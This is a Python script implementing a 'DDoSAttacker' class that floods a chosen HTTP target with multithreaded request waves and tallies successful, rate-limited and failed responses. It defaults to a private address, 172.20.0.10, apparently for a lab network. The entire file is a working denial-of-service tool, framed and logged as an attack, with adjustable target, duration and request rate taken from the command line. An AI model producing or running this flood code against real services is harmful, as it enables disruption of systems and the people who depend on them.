import requests
import threading
import time
from datetime import datetime
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('DDoS')

class DDoSAttacker:
    def __init__(self, target_ip, target_port=5000):
        self.target_url = f"http://{target_ip}:{target_port}/"
        self.packets_sent = 0
        self.packets_failed = 0
        self.packets_blocked = 0
        self.running = False
        self.lock = threading.Lock()
        
    def send_request(self):
        """Send single HTTP request"""
        try:
            response = requests.get(self.target_url, timeout=1)
            with self.lock:
                if response.status_code == 200:
                    self.packets_sent += 1
                elif response.status_code in [429, 403]:
                    self.packets_blocked += 1
                else:
                    self.packets_failed += 1
            return response.status_code
        except requests.exceptions.Timeout:
            with self.lock:
                self.packets_failed += 1
            return 'timeout'
        except Exception as e:
            with self.lock:
                self.packets_failed += 1
            return 'error'
    
    def attack_wave(self, num_requests, max_workers=50):
        """Execute attack wave with thread pool"""
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(self.send_request) for _ in range(num_requests)]
            
            for future in as_completed(futures):
                if not self.running:
                    break
                try:
                    result = future.result()
                except Exception as e:
                    logger.error(f"Request error: {e}")
    
    def run(self, duration=30, requests_per_second=50, max_workers=50):
        """Execute DDoS attack"""
        self.running = True
        start_time = time.time()
        
        print(f"\n{'='*60}")
        print(f"[{datetime.now()}] Starting DDoS Attack")
        print(f"{'='*60}")
        print(f"Target: {self.target_url}")
        print(f"Duration: {duration}s")
        print(f"Rate: {requests_per_second} req/s")
        print(f"Max Workers: {max_workers}")
        print(f"{'='*60}\n")
        
        wave_num = 0
        while time.time() - start_time < duration and self.running:
            wave_num += 1
            wave_start = time.time()
            
            print(f"[Wave {wave_num}] Launching {requests_per_second} requests...")
            self.attack_wave(requests_per_second, max_workers)
            
            elapsed = time.time() - wave_start
            print(f"[Wave {wave_num}] Complete - Sent: {self.packets_sent}, Blocked: {self.packets_blocked}, Failed: {self.packets_failed}")
            
            # Maintain rate
            if elapsed < 1:
                time.sleep(1 - elapsed)
        
        total_time = time.time() - start_time
        total_requests = self.packets_sent + self.packets_blocked + self.packets_failed
        
        print(f"\n{'='*60}")
        print(f"[{datetime.now()}] Attack Complete")
        print(f"{'='*60}")
        print(f"Duration: {total_time:.2f}s")
        print(f"Total Requests: {total_requests}")
        print(f"Successful: {self.packets_sent} ({self.packets_sent/total_requests*100:.1f}%)")
        print(f"Blocked: {self.packets_blocked} ({self.packets_blocked/total_requests*100:.1f}%)")
        print(f"Failed: {self.packets_failed} ({self.packets_failed/total_requests*100:.1f}%)")
        print(f"Requests/sec: {total_requests/total_time:.1f}")
        print(f"{'='*60}\n")
        
        self.running = False

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "172.20.0.10"
    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 20
    rate = int(sys.argv[3]) if len(sys.argv) > 3 else 100
    
    attacker = DDoSAttacker(target)
    try:
        attacker.run(duration=duration, requests_per_second=rate, max_workers=50)
    except KeyboardInterrupt:
        print("\n\nAttack interrupted by user")
        attacker.running = False
